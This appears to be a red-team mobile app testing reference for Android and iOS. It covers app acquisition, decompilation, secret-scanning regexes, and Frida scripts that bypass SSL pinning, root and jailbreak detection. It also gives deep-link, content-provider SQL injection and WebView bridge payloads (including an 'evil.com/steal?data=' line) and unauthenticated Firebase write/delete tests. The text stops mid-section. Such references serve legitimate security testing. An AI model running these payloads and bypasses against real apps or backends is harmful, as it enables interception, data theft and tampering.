# Mobile App Security Testing Rules — Complete Reference

> Author: Red Team / Bug Bounty Mobile Testing Standard
> Covers: Android APK & iOS IPA acquisition, static/dynamic analysis, Frida instrumentation, API discovery, secret scanning, WebView attacks, SSL pinning bypass, Firebase recon, deep-link injection, Burp proxy setup, iOS non-jailbreak analysis

---

## Table of Contents

1.  [APK Acquisition](#1-apk-acquisition)
2.  [APK Decompilation & Disassembly](#2-apk-decompilation--disassembly)
3.  [IPA Acquisition & Analysis (iOS)](#3-ipa-acquisition--analysis-ios)
4.  [Endpoint Extraction from Decompiled Code](#4-endpoint-extraction-from-decompiled-code)
5.  [Secret & Regex Scanning in Smali/Dex](#5-secret--regex-scanning-in-smalidex)
6.  [Hardcoded API Keys, Tokens & Credentials](#6-hardcoded-api-keys-tokens--credentials)
7.  [Deep Link Analysis for Injection](#7-deep-link-analysis-for-injection)
8.  [WebView Attack Surface](#8-webview-attack-surface)
9.  [SSL Pinning Bypass (Frida & Objection)](#9-ssl-pinning-bypass-frida--objection)
10. [Certificate Transparency for Mobile API Domains](#10-certificate-transparency-for-mobile-api-domains)
11. [Android-Specific Vulnerability Patterns](#11-android-specific-vulnerability-patterns)
12. [iOS-Specific Vulnerability Patterns](#12-ios-specific-vulnerability-patterns)
13. [Firebase Database Discovery from APK Strings](#13-firebase-database-discovery-from-apk-strings)
14. [Frida Instrumentation Scripts](#14-frida-instrumentation-scripts)
15. [Burp Proxy Setup for Mobile Traffic](#15-burp-proxy-setup-for-mobile-traffic)
16. [iOS Analysis Without Jailbreak](#16-ios-analysis-without-jailbreak)
17. [Complete Mobile Testing Workflows](#17-complete-mobile-testing-workflows)

---

## 1. APK Acquisition

### 1.1 Google Play Store — Manual Download

APKPure mirror: `https://apkpure.com/<package-name>/download?from=details`
APKMirror mirror: `https://www.apkmirror.com/apk/<vendor>/<app-name>/`

### 1.2 Google Play Store — Automated (CLI)

```bash
# Using google-play-scraper (Node.js)
npx google-play-scraper --package com.example.app --download

# Using gplaycli (Python)
pip install gplaycli
gplaycli -d com.example.app -p /tmp/

# Using apkeep (Rust, cross-platform)
cargo install apkeep
apkeep -a com.example.app .
```

### 1.3 APKPure CLI Download

```bash
curl -s "https://apkpure.com/<app-name>/com.example.app/download" \
  -H "User-Agent: Mozilla/5.0" \
  -L -o app.apk

pip install apkpure-dl
apkpure-dl com.example.app -o app.apk
```

### 1.4 APKMirror CLI Download

```bash
curl -s "https://www.apkmirror.com/apk/<vendor>/<app>/<variant>/" \
  | grep -oP 'href="[^"]*download/[^"]*"' \
  | head -1

curl -L -o app.apk "<download-url>"
```

### 1.5 Extraction from Physical Device / Emulator

```bash
# List packages
adb shell pm list packages | grep <keyword>

# Pull APK path
adb shell pm path com.example.app

# Pull to host
adb pull /data/app/com.example.app-xxx/base.apk app.apk
```

### 1.6 APK Extraction Without Root (using Backup)

```bash
adb backup -f app.ab -noapk com.example.app
dd if=app.ab bs=1 skip=24 | python -c "import zlib,sys;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" > app.tar
tar xf app.tar
```

### 1.7 Check APK Integrity

```bash
apksigner verify --print-certs app.apk
apksigner verify -v app.apk
keytool -printcert -jarfile app.apk
```

### 1.8 Extract APK Info

```bash
aapt dump badging app.apk
aapt dump permissions app.apk
aapt dump xmltree app.apk AndroidManifest.xml
```

---

## 2. APK Decompilation & Disassembly

### 2.1 jadx — Decompile to Java

```bash
jadx -d output_dir app.apk
jadx -d output_dir --show-bad-code --verbose app.apk
jadx -d output_dir -e app.apk
jadx -d output_dir --export-gradle app.apk
jadx -d output_dir --deobf app.apk
jadx -d output_dir -j 8 app.apk
```

### 2.2 jadx-gui — Interactive Browsing

```bash
jadx-gui app.apk
```

### 2.3 apktool — Resource & Smali Extraction

```bash
apktool d app.apk -o output_dir
apktool d app.apk -o output_dir --no-res
apktool d app.apk -o output_dir --no-res --no-assets
apktool if framework-res.apk
apktool b output_dir -o rebuilt.apk
apksigner sign --ks my.keystore --ks-pass pass:android --out signed.apk rebuilt.apk
```

### 2.4 JEB Decompiler (Commercial)

```bash
jeb_wincon.bat -c --sdk2 --analyze app.apk --outdir=output
```

### 2.5 dex2jar + JD-GUI

```bash
d2j-dex2jar.sh app.apk -o app.jar
unzip app.apk classes.dex
d2j-dex2jar.sh classes.dex -o app.jar
jd-gui app.jar
```

### 2.6 enjarify

```bash
enjarify app.apk -o app.jar
```

### 2.7 Analyze Manifest

```bash
apktool d app.apk -o tmp && cat tmp/AndroidManifest.xml
aapt dump xmltree app.apk AndroidManifest.xml
aapt dump permissions app.apk | grep -E "android\\.permission\\." | sort
```

---

## 3. IPA Acquisition & Analysis (iOS)

### 3.1 Download from App Store (macOS)

```bash
# Using Apple Configurator 2 (macOS)
# 1. Connect iOS device
# 2. Open Apple Configurator 2
# 3. Select device -> Add -> Apps
# 4. Find IPA in ~/Library/Group Containers/.../Temp/

# Using ipatool (CLI)
pip install ipatool-py
ipatool download -b com.example.app -o app.ipa --email <apple-id>
```

### 3.2 Extract from iCloud / iTunes Backup

```bash
idevicebackup2 backup --full ./backup
ideviceinstaller -l
```

### 3.3 Extract IPA from Device (Jailbroken)

```bash
pip install frida-tools
iproxy 2222 22
ssh root@localhost -p 2222
frida-ios-dump -o app.ipa com.example.app
```

### 3.4 IPA Extraction Without Jailbreak

```bash
# Using iMazing (no jailbreak):
# 1. Open iMazing
# 2. Right-click app -> Export IPA
```

### 3.5 IPA Unpacking & Analysis

```bash
mv app.ipa app.zip
unzip -q app.zip -d ipa_payload/
ls ipa_payload/Payload/
file ipa_payload/Payload/*.app/
plutil -p ipa_payload/Payload/*.app/Info.plist
plutil -convert xml1 ipa_payload/Payload/*.app/Info.plist
```

### 3.6 Binary Analysis (Mach-O)

```bash
lipo -info ipa_payload/Payload/*.app/<AppBinary>
nm ipa_payload/Payload/*.app/<AppBinary> | head -100
class-dump -H ipa_payload/Payload/*.app/<AppBinary> -o headers/
```

### 3.7 IPA Binary Disassembly

```bash
# radare2
r2 ipa_payload/Payload/*.app/<AppBinary>
# Hopper / Ghidra for GUI-based analysis
```

### 3.8 IPA String Extraction

```bash
strings ipa_payload/Payload/*.app/<AppBinary> | grep -iE "(https?|api|secret|key|token|password)" | sort -u
find ipa_payload -type f -exec strings {} \\; | grep -iE "(https?|api[./]|secret)" | sort -u
```

### 3.9 IPA Entitlements & Permissions

```bash
codesign -d --entitlements - ipa_payload/Payload/*.app/
codesign -d --entitlements :- ipa_payload/Payload/*.app/ > entitlements.plist
plutil -p entitlements.plist
```

---

## 4. Endpoint Extraction from Decompiled Code

### 4.1 URL/String Pattern Grep (jadx Output)

```bash
grep -rnoP 'https?://[^"'"'"'\\s)>}]{3,300}' decompiled_sources/ \
  | grep -vE '(android\\.google|googleapis|github\\.com|example\\.com)' \
  | sort -u > api_endpoints.txt

grep -rnoP 'https?://[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}[^"'"'"'\\s)>}]{0,200}' decompiled_sources/ \
  | sort -u
```

### 4.2 Endpoint Extraction from Smali

```bash
grep -rnoP 'const-string.*https?://' smali_output/ \
  | sed 's/.*const-string.*"\\([^"]*\\)".*/\\1/' \
  | sort -u
```

### 4.3 GraphQL Endpoint Detection

```bash
grep -riP '(graphql|gql|query|mutation).*?(api|endpoint|url|https?)' decompiled_sources/ \
  | grep -oiP 'https?://[^"'"'"'\\s)]+/graphql' \
  | sort -u
```

### 4.4 REST API Endpoint Reconstruction

```bash
grep -rnoP '@(GET|POST|PUT|DELETE|PATCH)\\s*\\(\\s*"[^"]*"\\)' decompiled_sources/ | sort -u
grep -rnoP '(BaseUrl|baseUrl|API_URL|API_BASE|SERVER_URL|endpoint)' decompiled_sources/
```

### 4.5 OkHttp/URLConnection Usage

```bash
grep -rn 'OkHttpClient' decompiled_sources/ | head -20
grep -rn 'HttpURLConnection' decompiled_sources/ | head -20
```

### 4.6 WebSocket Endpoint Discovery

```bash
grep -riP '(wss?://|WebSocket|websocket|socket\\.io|SockJS)' decompiled_sources/ \
  | grep -oP 'wss?://[^"'"'"'\\s)]+' | sort -u
```

### 4.7 Deep Link/URL Scheme Endpoints

```bash
grep -A5 'android:scheme' smali_output/AndroidManifest.xml \
  | grep -oP 'android:scheme="[^"]*"' | cut -d'"' -f2
```

---

## 5. Secret & Regex Scanning in Smali/Dex

### 5.1 Generic Secret Patterns

```bash
# AWS Access Key
grep -rnoP 'AKIA[0-9A-Z]{16}' decompiled_sources/

# Google API Key
grep -rnoP 'AIza[0-9A-Za-z-_]{35}' decompiled_sources/

# Firebase URL
grep -rnoP 'https://[a-zA-Z0-9-]+\\.firebaseio\\.com' decompiled_sources/

# Slack Token
grep -rnoP '(xox[baprs]-[0-9a-zA-Z-]{10,})' decompiled_sources/

# GitHub Token
grep -rnoP '(ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,}' decompiled_sources/

# JWT
grep -rnoP 'eyJ[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}' decompiled_sources/

# Stripe API Key
grep -rnoP '(?:sk|pk)_(?:live|test)_[0-9a-zA-Z]{24,}' decompiled_sources/

# Generic API key pattern
grep -rnoP '(?i)(api[_-]?key|apikey|api[_-]?secret|app[_-]?secret).{0,30}["\'"'"'"'"']([A-Za-z0-9+/=_\\-]{16,64})["\'"'"'"'"']' decompiled_sources/ | sort -u
```

### 5.2 Firebase Secret Scanning

```bash
grep -rnoP '"mobilesdk_app_id":\\s*"[^"]*"' decompiled_sources/ | sort -u
grep -rnoP '"project_number":\\s*"[^"]*"' decompiled_sources/ | sort -u
grep -rnoP '"api_key":\\s*\\{"current_key":\\s*"[^"]*"\\}' decompiled_sources/
```

### 5.3 Certificate & KeyStore Files

```bash
unzip -l app.apk | grep -iE '\\.(jks|bks|p12|pfx|cer|crt|pem|key|keystore)'
keytool -list -keystore certs/truststore.jks -storepass changeit
```

### 5.4 Hardcoded Database Creds

```bash
grep -rnoP '(?i)(jdbc|mysql|postgres|mssql|mongodb|redis).*[:@].*//[^"'"'"'\\s]+' decompiled_sources/ | sort -u
```

### 5.5 Cloud Platform Credentials

```bash
grep -rnoP 'DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[^";]+' decompiled_sources/
grep -rnoP '"private_key":\\s*"-----BEGIN [A-Z ]+ PRIVATE KEY-----' decompiled_sources/
grep -rnoP '(?i)heroku.*[A-Fa-f0-9-]{36}' decompiled_sources/
```

---

## 6. Hardcoded API Keys, Tokens & Credentials

### 6.1 Google Services Configuration

```bash
unzip -q app.apk -d tmp_apk
cat tmp_apk/res/values/strings.xml | grep -E '(google|firebase|gcm|api_key)'
aapt dump resources app.apk | grep -E '(google_api_key|google_app_id|gcm_defaultSenderId)'
```

### 6.2 Third-Party SDK Keys

```bash
grep -rnoP '(?i)(amplitude|mixpanel|segment|braze|branch|adjust|appsflyer|onesignal).{0,5}(key|token|id)' decompiled_sources/ | sort -u
grep -rnoP '"facebook_app_id":\\s*"[^"]*"' decompiled_sources/
grep -rnoP '"client_id":\\s*"[0-9]+-[a-z0-9]+\\.apps\\.googleusercontent\\.com"' decompiled_sources/
```

### 6.3 BuildConfig & Gradle Secrets

```bash
grep -rn 'BuildConfig\\.' decompiled_sources/ | grep -iE '(api|key|token|secret|endpoint|url)' | head -50
find decompiled_sources -name "BuildConfig.java" -exec cat {} \\;
```

### 6.4 Cipher/Encryption Key Discovery

```bash
grep -rnoP '(?i)(0x)?[0-9a-fA-F]{32}' decompiled_sources/ | grep -vE '(0x)?0{32}' | sort -u
grep -rn 'SecretKeySpec|SecretKeyFactory' decompiled_sources/ | head -20
```

---

## 7. Deep Link Analysis for Injection

### 7.1 Extract Deep Link Schemes from Manifest

```bash
grep -B20 'android:scheme' smali_output/AndroidManifest.xml | grep -E '(activity|scheme|host|path|data)'
aapt dump xmltree app.apk AndroidManifest.xml | grep -A50 'intent-filter'
```

### 7.2 Deep Link Injection Testing Payloads

```bash
# Basic injection
adb shell am start -d "exampleapp://path/test" -n com.example.app/.MainActivity

# JavaScript injection
adb shell am start -d "exampleapp://webview?url=javascript:alert(1)" -n com.example.app/.WebViewActivity

# Path traversal
adb shell am start -d "exampleapp://../../../../data/data/com.example.app/databases/" -n com.example.app/.MainActivity

# Fragment injection
adb shell am start -d "exampleapp://#Intent;scheme=evil;end" -n com.example.app/.MainActivity
```

### 7.3 Deep Link Fuzzing

```bash
# Test payloads
# - javascript:alert(1)
# - file:///data/data/com.example.app/databases/
# - content://settings/secure
# - intent://evil/
# - tel:123456
# - smsto:123456
# - geo:0,0?q=evil
# - http://evil.com/
# - https://evil.com/steal?data=
```

### 7.4 Intent Injection via Deep Links

```bash
adb shell am start -d "exampleapp://action?extra_intent=#Intent;action=android.intent.action.CALL;end"
adb shell am start -d "exampleapp://data" --es "com.example.EXTRA_URL" "javascript:alert(1)" -n com.example.app/.ReceiverActivity
```

### 7.5 iOS Universal Links & URL Scheme Injection

```bash
# Using simctl (Xcode)
xcrun simctl openurl booted "exampleapp://profile?id=123"

# Extract URL types from Info.plist
plutil -p ipa_payload/Payload/*.app/Info.plist | grep -A20 'CFBundleURLTypes'
```

---

## 8. WebView Attack Surface

### 8.1 WebView Detection in Decompiled Code

```bash
grep -rn 'WebView|webView|loadUrl|loadData' decompiled_sources/ --include="*.java" | head -50
grep -rn 'extends WebViewClient|extends WebChromeClient' decompiled_sources/ --include="*.java"
grep -rn 'shouldOverrideUrlLoading|onPageFinished|onReceivedSslError' decompiled_sources/ --include="*.java"
```

### 8.2 JavaScript Bridge Detection (addJavascriptInterface)

```bash
grep -rn 'addJavascriptInterface' decompiled_sources/ --include="*.java"
grep -rn '@JavascriptInterface|@JavaScriptInterface' decompiled_sources/ --include="*.java"
```

### 8.3 JavaScript Bridge RCE Exploitation

```javascript
// Frida: enumerate JS interfaces
Java.perform(function() {
    var WebView = Java.use('android.webkit.WebView');
    WebView.addJavascriptInterface.implementation = function(obj, name) {
        console.log('[JS Bridge] Interface: ' + name);
        console.log('[JS Bridge] Object class: ' + obj.getClass().getName());
        return this.addJavascriptInterface(obj, name);
    };
});

// Exploit payload (inject via deep link or MITM)
// <script>
//   for (var k in window) {
//     if (k.startsWith('Android') || k.startsWith('JSBridge')) {
//       window[k].execute("id");
//       window[k].run("id");
//       window[k].exec("id");
//     }
//   }
// </script>
```

### 8.4 WebView file:// Access Testing

```bash
grep -rn 'setAllowFileAccess|setAllowContentAccess|setAllowFileAccessFromFileURLs' decompiled_sources/ --include="*.java"
grep -rn 'getSettings\\(\\)|WebSettings' decompiled_sources/ --include="*.java" -A20 | head -80
```

### 8.5 WebView JavaScript Enabled Check

```bash
grep -rn 'setJavaScriptEnabled' decompiled_sources/ -A2
grep -rn 'setJavaScriptEnabled' smali_output/ | head -10
```

### 8.6 WebView SSL Error Handling

```bash
grep -rn 'onReceivedSslError|proceed|SslError' decompiled_sources/ --include="*.java" | head -30
# Look for: handler.proceed() = bad (accepts all SSL errors)
```

### 8.7 iOS WKWebView / UIWebView Analysis

```bash
strings ipa_payload/Payload/*.app/<AppBinary> | grep -iE '(WKWebView|UIWebView|webView|loadRequest|loadHTMLString)' | sort -u
strings ipa_payload/Payload/*.app/<AppBinary> | grep -iE '(evaluateJavaScript|stringByEvaluatingJavaScriptFromString)' | sort -u
strings ipa_payload/Payload/*.app/<AppBinary> | grep -iE '(addScriptMessageHandler|userContentController)' | sort -u
```

---

## 9. SSL Pinning Bypass (Frida & Objection)

### 9.1 Universal SSL Pinning Bypass (objection)

```bash
objection patchapk -s app.apk
objection explore -g com.example.app --startup-command "android sslpinning disable"
# In objection shell: android sslpinning disable
```

### 9.2 Frida Universal SSL Pinning Bypass Script

```javascript
// universal-ssl-bypass.js
Java.perform(function() {
    // Create trust-all TrustManager
    var TrustManager = Java.registerClass({
        name: 'com.example.TrustAllManager',
        implements: [Java.use('javax.net.ssl.X509TrustManager')],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    // Inject into SSLContext
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    SSLContext.init.overload(
        '[Ljavax.net.ssl.KeyManager;',
        '[Ljavax.net.ssl.TrustManager;',
        'java.security.SecureRandom'
    ).implementation = function(keyManagers, trustManagers, secureRandom) {
        console.log('[SSL] Injecting trust-all TrustManager');
        return this.init(keyManagers, [TrustManager.$new()], secureRandom);
    };

    // OkHttp bypass
    try {
        var OkHttpClient = Java.use('okhttp3.OkHttpClient$Builder');
        OkHttpClient.hostnameVerifier.implementation = function(hostnameVerifier) {
            console.log('[OkHttp] hostnameVerifier bypassed');
        };
        OkHttpClient.sslSocketFactory.overload(
            'javax.net.ssl.SSLSocketFactory',
            'javax.net.ssl.X509TrustManager'
        ).implementation = function(sslSocketFactory, trustManager) {
            console.log('[OkHttp] sslSocketFactory bypassed');
        };
    } catch(e) {}
});
```

```bash
frida -U -f com.example.app -l universal-ssl-bypass.js --no-pause
```

### 9.3 OkHttp3 CertificatePinner Bypass

```javascript
Java.perform(function() {
    var CertificatePinner = Java.use('okhttp3.CertificatePinner');
    CertificatePinner.check.overload(
        'java.lang.String',
        'java.util.List'
    ).implementation = function(hostname, peerCertificates) {
        console.log('[OkHttp] Bypassing pin check for: ' + hostname);
        return;
    };

    var Builder = Java.use('okhttp3.CertificatePinner$Builder');
    Builder.build.implementation = function() {
        console.log('[OkHttp] Returning empty CertificatePinner');
        return CertificatePinner.$new();
    };
});
```

### 9.4 TrustManager Injection

```javascript
Java.perform(function() {
    var TrustManager = Java.registerClass({
        name: 'com.frida.TrustManager',
        implements: [Java.use('javax.net.ssl.X509TrustManager')],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {
                console.log('[SSL] Server cert accepted: ' + chain[0].getSubjectDN().getName());
            },
            getAcceptedIssuers: function() { return []; }
        }
    });

    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    SSLContext.init.overload(
        '[Ljavax.net.ssl.KeyManager;',
        '[Ljavax.net.ssl.TrustManager;',
        'java.security.SecureRandom'
    ).implementation = function(keyManagers, trustManagers, secureRandom) {
        console.log('[SSL] Intercepting SSLContext.init()');
        return this.init(keyManagers, [TrustManager.$new()], secureRandom);
    };
});
```

### 9.5 Intercept Network Requests

```javascript
Java.perform(function() {
    var OkHttpClient = Java.use('okhttp3.OkHttpClient');
    OkHttpClient.newCall.implementation = function(request) {
        console.log('[HTTP] ' + request.method() + ' ' + request.url().toString());
        return this.newCall(request);
    };

    var HttpsURLConnection = Java.use('javax.net.ssl.HttpsURLConnection');
    HttpsURLConnection.connect.implementation = function() {
        console.log('[HTTP] Connecting to: ' + this.getURL());
        return this.connect();
    };
});
```

### 9.6 iOS SSL Pinning Bypass (Frida)

```javascript
if (ObjC.available) {
    var NSURLSession = ObjC.classes.NSURLSession;
    Interceptor.attach(NSURLSession['- dataTaskWithRequest:completionHandler:'].implementation, {
        onEnter: function(args) {
            var request = new ObjC.Object(args[2]);
            console.log('[NSURLSession] Request: ' + request.URL().absoluteString());
        }
    });

    var AFSecurityPolicy = ObjC.classes.AFSecurityPolicy;
    if (AFSecurityPolicy) {
        AFSecurityPolicy['- setPinnedCertificates:'] = function() {};
        AFSecurityPolicy['- setAllowInvalidCertificates:'] = function(v) {};
    }
}
```

### 9.7 Objection Commands Reference

```bash
# objection interactive commands:
#   android sslpinning disable
#   android root disable
#   android heap dump /tmp/heap.dmp
#   android ui screenshot /tmp/screenshot.png
#   android keystore list
#   android keystore get <alias>
#   android hooking list classes
#   android hooking watch class <classname>
#   android intent monitoring enable
```

### 9.8 Frida-Gadget Injection (Non-Root)

```bash
objection patchapk -s app.apk -g
echo '{"interaction":{"type":"listen","address":"127.0.0.1","port":27042}}' > gadget_config.json
objection patchapk -s app.apk -g -c gadget_config.json
adb install -r app.objection.apk
frida -H 127.0.0.1:27042
```

### 9.9 Root Detection Bypass (Frida)

```javascript
Java.perform(function() {
    // RootBeer
    try {
        var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
        RootBeer.isRooted.implementation = function() { return false; };
    } catch(e) {}

    // File check bypass
    var File = Java.use('java.io.File');
    var origExists = File.exists.implementation;
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        var blocklist = ['/su', '/sbin/su', '/system/bin/su', '/system/xbin/su',
                         '/data/local/su', '/system/app/Superuser.apk'];
        if (blocklist.indexOf(path) >= 0) {
            console.log('[Root] Blocked: ' + path);
            return false;
        }
        return origExists.call(this);
    };

    // Runtime exec bypass
    var Runtime = Java.use('java.lang.Runtime');
    Runtime.exec.overload('[Ljava.lang.String;').implementation = function(cmdarray) {
        var cmd = cmdarray.join(' ');
        if (cmd.indexOf('su') >= 0 || cmd.indexOf('root') >= 0) {
            console.log('[Root] Blocked exec: ' + cmd);
            throw new Error('Blocked');
        }
        return this.exec(cmdarray);
    };
});
```

---

## 10. Certificate Transparency for Mobile API Domains

### 10.1 Extract API Domains from APK

```bash
grep -rnoP 'https?://[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}[^"'"'"'\\s)>}]{0,200}' decompiled_sources/ \
  | grep -oP 'https?://([a-zA-Z0-9-]+\\.)+[a-zA-Z]{2,}' | sort -u > domains.txt

grep -vE '(googleapis|gstatic|cloudflare|akamai|amazonaws|facebook|google|twitter|apple|github)' domains.txt > api_domains.txt
```

### 10.2 Certificate Transparency Log Lookup

```bash
# crt.sh
for domain in $(cat api_domains.txt); do
  curl -s "https://crt.sh/?q=%25.$domain&output=json" | jq -r '.[].commonName // .[].name_value' | sort -u | grep -v '*' | head -20
  sleep 1
done

# certspotter
for domain in $(cat api_domains.txt); do
  curl -s "https://api.certspotter.com/v1/issuances?domain=$domain&include_subdomains=true&expand=dns_names" | jq -r '.[].dns_names[]' | sort -u
  sleep 0.5
done
```

### 10.3 Check Domain SSL Configuration

```bash
for domain in $(cat api_domains.txt); do
  echo "=== $domain ==="
  echo | openssl s_client -connect "$domain:443" -servername "$domain" 2>/dev/null \
    | openssl x509 -noout -text 2>/dev/null \
    | grep -E '(Subject:|Issuer:|Not Before|Not After|DNS:)' | head -10
  curl -sI "https://$domain/" | grep -i 'strict-transport-security'
  echo "---"
done
```

### 10.4 Check for Pinning in Decompiled Code

```bash
grep -rnoP 'sha256/[A-Za-z0-9+/=]{44}' decompiled_sources/ | sort -u
grep -rniE '(pinning|pinner|certificatePinner|certificate_pinner|publicKeyPin)' decompiled_sources/ | head -30
```

### 10.5 Detect Insecure API Communication

```bash
grep -rnoP 'http://[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}[^"'"'"'\\s)]*' decompiled_sources/ | grep -v 'https://' | sort -u
grep -rnoP 'ws://[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' decompiled_sources/ | sort -u
```

---

## 11. Android-Specific Vulnerability Patterns

### 11.1 Exported Components

```bash
grep -B2 'exported="true"' smali_output/AndroidManifest.xml | grep -E '(activity|service|receiver|provider)' | sort -u
grep -B10 'android:authorities' smali_output/AndroidManifest.xml
grep -B5 'android.intent.action.BOOT_COMPLETED|SMS_RECEIVED|CONNECTIVITY_CHANGE' smali_output/AndroidManifest.xml
```

### 11.2 Content Provider Injection

```bash
adb shell content query --uri content://com.example.app.provider/users/
adb shell content query --uri content://com.example.app.provider/ --projection "*"
adb shell content query --uri content://com.example.app.provider/ --where "1=1"
adb shell content query --uri content://com.example.app.provider/users/ --where "name=' OR '1'='1"
adb shell content query --uri content://com.example.app.provider/../../data/data/com.example.app/databases/
```

### 11.3 Intent Redirection / Fragment Injection

```bash
adb shell am start -a android.intent.action.VIEW -d "exampleapp://fragment?class=com.example.hacked.Fragment" -n com.example.app/.MainActivity
adb shell am start -a android.intent.action.VIEW -d "exampleapp://redirect?intent=#Intent;action=android.intent.action.CALL;end" -n com.example.app/.RedirectActivity
```

### 11.4 Insecure Data Storage

```bash
grep -rn 'SharedPreferences|getSharedPreferences|getPreferences' decompiled_sources/ --include="*.java" | grep -iE '(token|password|key|secret|auth|session|pin|credit|ssn)' | head -30
grep -rn 'SQLiteDatabase|openOrCreateDatabase|db\\.execSQL|rawQuery' decompiled_sources/ --include="*.java" | head -30
grep -rn 'getExternalStorage|Environment\\.getExternalStorage' decompiled_sources/ --include="*.java" | head -20
```

### 11.5 Insecure Logging

```bash
grep -rn 'Log\\.|System\\.out\\.println' decompiled_sources/ --include="*.java" | grep -iE '(token|password|key|secret|auth|session|jwt|api)' | head -30
```

### 11.6 Tapjacking / Overlay Attack

```bash
grep -rn 'FLAG_SECURE|setFlags' decompiled_sources/ --include="*.java" | grep -i 'flag_secure|FLAG_SECURE' | head -10
grep -rn 'filterTouchesWhenObscured' smali_output/AndroidManifest.xml
```

### 11.7 Debuggable Flag

```bash
aapt dump badging app.apk | grep 'debuggable'
grep -rn 'android:debuggable' smali_output/AndroidManifest.xml
```

### 11.8 Backup Flag

```bash
grep -rn 'android:allowBackup' smali_output/AndroidManifest.xml
adb backup -f backup.ab com.example.app
```

### 11.9 Exported Broadcast Receiver Injection

```bash
adb shell am broadcast -a com.example.app.ACTION_SECRET --es "data" "injected"
adb shell am broadcast -a android.intent.action.BOOT_COMPLETED -n com.example.app/.BootReceiver
```

---

## 12. iOS-Specific Vulnerability Patterns

### 12.1 iOS Data Storage Insecurity

```bash
strings ipa_payload/Payload/*.app/<AppBinary> | grep -iE '(NSUserDefaults|standardUserDefaults|synchronize)' | sort -u
strings ipa_payload/Payload/*.app/<AppBinary> | grep -iE '(CoreData|NSPersistentStoreCoordinator|NSManagedObjectContext)' | sort -u
strings ipa_payload/Payload/*.app/<AppBinary> | grep -iE '(Keychain|SecItemAdd|SecItemCopyMatching|kSecClass|kSecAttrAccount|kSecValueData)' | sort -u
```

### 12.2 iOS Insecure Keychain

```bash
# Keychain data dump (jailbroken)
scp keychain_dumper root@<device>:/tmp/
ssh root@<device> /tmp/keychain_dumper --entitlements

# Keychain via objection: ios keychain dump
# Keychain via Frida: frida -U com.example.app -l ios-keychain-dump.js
```

### 12.3 iOS Network Security (ATS)

```bash
plutil -p ipa_payload/Payload/*.app/Info.plist | grep -A20 'NSAppTransportSecurity'
# NSAllowsArbitraryLoads = true means NO ATS
strings ipa_payload/Payload/*.app/<AppBinary> | grep -oiP 'http://[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}[^"'"'"'\\s)]*' | sort -u
```

### 12.4 iOS Jailbreak Detection Bypass (Frida)

```javascript
if (ObjC.available) {
    var jbPaths = ['/Applications/Cydia.app', '/bin/bash', '/etc/apt', '/usr/sbin/sshd', '/jb', '/jbin'];

    var NSFileManager = ObjC.classes.NSFileManager;
    var origFileExists = NSFileManager['- fileExistsAtPath:'].implementation;
    NSFileManager['- fileExistsAtPath:'] = function(self, sel, path) {
        var pathStr = ObjC.classes.NSString.stringWithString_(path).toString();
        for (var i = 0; i < jbPaths.length; i++) {
            if (pathStr.indexOf(jbPaths[i]) >= 0) { console.log('[JB] Blocked: ' + pathStr); return 0; }
        }
        return origFileExists(self, sel, path);
    };
}
```

---

## 13. Firebase Database Discovery from APK Strings

### 13.1 Extract Firebase URLs

```bash
grep -rnoP 'https?://[a-zA-Z0-9-]+\\.firebaseio\\.com' decompiled_sources/ | sort -u
grep -rnoP '[a-zA-Z0-9-]+\\.firebaseio\\.com' decompiled_sources/ | sort -u
grep -rnoP 'project_id["\'"'"'"]?\\s*[:=]\\s*["\'"'"'"]([a-zA-Z0-9-]+)["\'"'"'"]' decompiled_sources/ | sort -u
grep -rnoP 'firebase.*database.*url|databaseURL|FIREBASE_DB' decompiled_sources/ | sort -u
```

### 13.2 Firebase Database Open Access Testing

```bash
# Test read without auth
curl -s "https://<project>.firebaseio.com/.json"
curl -s "https://<project>.firebaseio.com/users.json"

# Write without auth
curl -X PUT -d '{"test": true}' "https://<project>.firebaseio.com/pwned.json"

# Delete without auth
curl -X DELETE "https://<project>.firebaseio.com/pwned.json"
```

### 13.3 Firebase Database Discovery Script

```bash
echo "=== Firebase Discovery ==="
grep -rnoP '"project_id":\\s*"([^"]+)"' decompiled_sources/ 2>/dev/null | head -5
grep -rnoP '"mobilesdk_app_id":\\s*"([^"]+)"' decompiled_sources/ 2>/dev/null | head -5
grep -rnoP '"storage_bucket":\\s*"([^"]+)"' decompiled_sources/ 2>/dev/null | head -5
grep -rnoP '"project_number":\\s*"([^"]+)"' decompiled_sources/ 2>/dev/null | head -5
grep -rnoP 'https://us-central1-[a-zA-Z0-9-]+\\.cloudfunctions\\.net' decompiled_sources/ | sort -u
grep -rnoP '[a-zA-Z0-9-]+\\.firebaseapp\\.com' decompiled_sources/ | sort -u
```

### 13.4 Firebase Auth Discovery

```bash
# Find Firebase Auth API key
grep -rnoP 'AIza[0-9A-Za-z-_]{35}' decompiled_sources/ | head -5

# Test sign-in
curl -s 'https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<API_KEY>' \
  -H 'Content-Type: application/json' \
  -d '{"email":"test@test.com","password":"Test123!","returnSecureToken":true}'

# Firebase Storage
grep -rnoP '[a-zA-Z0-9-]+\\.appspot\\.com' decompiled_sources/ 2>/dev/null
curl -s "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
```

### 13.5 Firebase Cloud Functions Discovery

```bash
grep -rnoP 'https://[a-z]+-[a-zA-Z0-9-]+\\.cloudfunctions\\.net/' decompiled_sources/ | sort -u
curl -s "https://us-central1-<project>.cloudfunctions.net/functionName" -H "Content-Type: application/json"
```

### 13.6 Firebase Comprehensive Security Check

```bash
PROJECT="<project-id>"
echo "Database:"; curl -s "https://$PROJECT.firebaseio.com/.json" | head -50
